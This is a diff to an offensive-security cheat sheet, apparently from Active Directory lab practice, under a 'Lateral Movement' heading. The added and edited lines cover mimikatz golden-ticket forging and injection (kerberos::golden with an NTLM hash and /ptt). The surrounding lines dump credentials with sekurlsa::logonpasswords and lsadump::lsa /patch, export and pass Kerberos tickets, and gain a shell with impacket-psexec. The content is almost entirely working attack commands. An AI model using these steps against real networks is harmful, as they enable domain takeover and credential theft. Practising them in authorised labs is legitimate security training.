@@ -122,6 +122,8 @@ net accounts
 ```
 
 ### Lateral Movement
+/ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
+/ptt - no output in file, just inject the golden ticket in current session.
 ###### Get shell with clear password
 ```
 impacket-psexec offsec.local/allison@192.168.151.59
@@ -148,7 +150,7 @@ klist
 ```
 whoami /user
 kerberos::purge
-kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(ntlm hash from sekurlsa::logonpasswords) /ptt
+kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(ntlm hash from sekurlsa::logonpasswords,lsadump::lsa /patch) /ptt
 kerberos::list
 sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
